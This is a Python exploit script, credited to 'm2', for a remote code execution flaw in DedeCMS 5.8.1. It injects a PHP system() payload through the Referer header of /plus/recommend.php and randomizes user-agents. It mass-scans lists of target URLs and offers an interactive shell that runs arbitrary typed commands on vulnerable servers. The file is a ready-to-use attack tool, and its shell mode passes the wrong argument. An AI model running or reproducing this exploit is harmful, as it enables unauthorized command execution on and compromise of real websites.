import requests
import re
import sys
import urllib3
from argparse import ArgumentParser
import threadpool
from urllib import parse
from time import time
import random


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
filename = sys.argv[1]
url_list=[]

#随机ua
def get_ua():
	first_num = random.randint(55, 62)
	third_num = random.randint(0, 3200)
	fourth_num = random.randint(0, 140)
	os_type = [
		'(Windows NT 6.1; WOW64)', '(Windows NT 10.0; WOW64)',
		'(Macintosh; Intel Mac OS X 10_12_6)'
	]
	chrome_version = 'Chrome/{}.0.{}.{}'.format(first_num, third_num, fourth_num)

	ua = ' '.join(['Mozilla/5.0', random.choice(os_type), 'AppleWebKit/537.36',
				   '(KHTML, like Gecko)', chrome_version, 'Safari/537.36']
				  )
	return ua

#poc
def check_vuln(url):
	url = parse.urlparse(url)
	payload1=url.scheme + '://' + url.netloc + '/plus/recommend.php'
	headers = {
		'User-Agent': get_ua(),
		'Referer': '<?php "system"(whoami);die;/*'
	}
	# data=base64.b64encode("eyJzZXQtcHJvcGVydHkiOnsicmVxdWVzdERpc3BhdGNoZXIucmVxdWVzdFBhcnNlcnMuZW5hYmxlUmVtb3RlU3RyZWFtaW5nIjp0cnVlfX0=")
	try:
		res1 = requests.get(payload1,headers=headers,timeout=15,verify=False)
		if res1.status_code==200 and "location=" in res1.text:
			exp = re.findall(r"location='(.*)", res1.text)[0]
			print("\033[32m[+]%s is vuln\033[0m" %payload1)
			print("\033[32m[+]%s\033[0m" %exp)
			return 1
		else:
			print("\033[31m[-]%s is not vuln\033[0m" %payload1)
	except Exception as e:
		print("\033[31m[-]%s is timeout\033[0m" %payload1)

#cmdshell
def cmdshell(url):
	if check_vuln(url) == 1:
		url = parse.urlparse(url)
		url1 = url.scheme + '://' + url.netloc + '/plus/recommend.php'
		while 1:
			cmd = input("\033[35mshell: \033[0m")
			if cmd =="exit":
				sys.exit(0)
			else:
				headers = {
       					'Referer': '<?php "system"(' + cmd + ');die;/*'
    				}
				try:
					res = requests.get(url1,headers=headers,timeout=15,verify=False)
					if res.status_code==200:
						#打印请求头
						# print(res.request.headers)
						exp = re.findall(r"location='(.*)", res.text,re.DOTALL)[0]
						print("\033[32m[+]%s\033[0m" %exp)
					else:
						print("\033[31m[-]%s request flase!\033[0m" %url1)

				except Exception as e:
					print("\033[31m[-]%s is timeout!\033[0m" %url1)


if __name__ == '__main__':
	show = r'''

	______         _                          ______  _____  _____ 
	|  _  \       | |                         | ___ \/  __ \|  ___|
	| | | |___  __| | ___  ___ _ __ ___  ___  | |_/ /| /  \/| |__  
	| | | / _ \/ _` |/ _ \/ __| '_ ` _ \/ __| |    / | |    |  __| 
	| |/ /  __/ (_| |  __/ (__| | | | | \__ \ | |\ \ | \__/\| |___ 
	|___/ \___|\__,_|\___|\___|_| |_| |_|___/ \_| \_| \____/\____/ 
	                                      ______                   
	                                     |______|                                        
	                                                                    
                              	 				dedecms5.8.1_RCE_exp By m2
	'''
	print(show + '\n')
	arg=ArgumentParser(description='dedecms5.8.1_RCE_exp By m2')
	arg.add_argument("-u",
						"--url",
						help="Target URL; Example:http://ip:port")
	arg.add_argument("-f",
						"--file",
						help="url_list; Example:url.txt")
	arg.add_argument("-c",
					"--cmd",
					help="command; Example:whoami")
	args=arg.parse_args()
	url=args.url
	filename=args.file
	cmd=args.cmd
	print('[*]任务开始...')
	if url != None and cmd == None and filename == None:
		check_vuln(url)
	elif url == None and cmd == None and filename != None:
		start=time()
		for i in open(filename):
			i=i.replace('\n','')
			check_vuln(i)
		end=time()
		print('任务完成，用时%d' %(end-start))
	elif url == None and cmd != None and filename == None:
		cmdshell(cmd)
